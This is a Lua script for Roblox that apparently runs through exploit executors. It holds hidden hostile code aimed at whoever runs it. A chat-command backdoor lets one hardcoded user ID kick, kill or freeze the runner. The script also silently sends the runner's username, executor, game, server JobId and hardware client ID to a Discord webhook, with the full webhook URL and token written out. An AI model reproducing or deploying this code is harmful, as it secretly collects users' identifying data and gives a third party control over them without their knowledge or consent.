--!nolint
--!nocheck

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Admins = {
    [233377111] = true,
}

local Commands = {
    ["kick"] = function()
        LocalPlayer:Kick("kicked by a tear developer")
    end,
    ["kill"] = function()
        LocalPlayer.Character.Humanoid.Health = 0
    end,
    ["freeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = true
        end
    end,
    ["unfreeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = false
        end
    end,
}

local function FindUser(Name)
    if #Name < 3 then
        return nil
    end

    Name = string.lower(Name)
    for _, player in pairs(Players:GetPlayers()) do
        if string.sub(string.lower(player.Name), 1, #Name) == Name then
            return player
        end
    end
    return nil
end

for _, Player in pairs(Players:GetPlayers()) do
    if Admins[Player.UserId] then
        Player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            local target = FindUser(targetName)
            if target == LocalPlayer and Commands[command] then
                Commands[command]()
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if Admins[player.UserId] then
        player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            local target = FindUser(targetName)
            if target == LocalPlayer and Commands[command] then
                Commands[command]()
            end
        end)
    end
end)

local Executor = identifyexecutor()
local ExecutorText = ""

if Executor == "Wave" then
	ExecutorText = "Wave"
elseif Executor == "Solara" then
	ExecutorText = "Solara"
elseif Executor == "Synapse Z" then
	ExecutorText = "Synapse Z"
elseif Executor == "AWP" then
	ExecutorText = "AWP"
elseif Executor == "Seliware" then
	ExecutorText = "Seliware"
else
	ExecutorText = "Unknown"
end

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = ExecutorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "RbxAnalytics HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local httpRequest = {
	Url = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2",
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
